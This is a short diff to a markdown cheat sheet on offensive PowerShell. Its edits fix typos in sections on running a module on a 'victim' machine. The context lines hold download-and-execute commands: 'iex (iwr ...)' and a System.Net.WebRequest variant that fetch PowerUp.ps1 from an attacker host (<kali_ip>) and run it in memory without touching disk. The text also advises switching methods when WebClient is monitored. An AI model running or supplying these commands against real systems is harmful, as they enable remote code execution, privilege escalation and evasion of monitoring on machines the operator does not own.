@@ -11,7 +11,7 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File 
 ## Execute file in memory
 
 Let's say you would like to execute PS module from you Apache / SimpleHTTPServer on the victim. 
-The following techniques will downloaf the PS module and execute it in memory with no touching the disk.
+The following techniques will download the PS module and execute it in memory with no touching the disk.
 
 For Powershell 1.0 - 2.0:
 
@@ -27,7 +27,7 @@ PS C:\> iex (iwr 'http://<kali_ip>/PowerUp.ps1')
 
 ## Execute Script without Webclient
 
-In some case WebClient might be moitored so try another way:
+In some case WebClient might be blocked so try another way:
 
 ```
 PS C:\> $wr = [System.NET.WebRequest]::Create("http://<kali_ip>/PowerUp.ps1") 
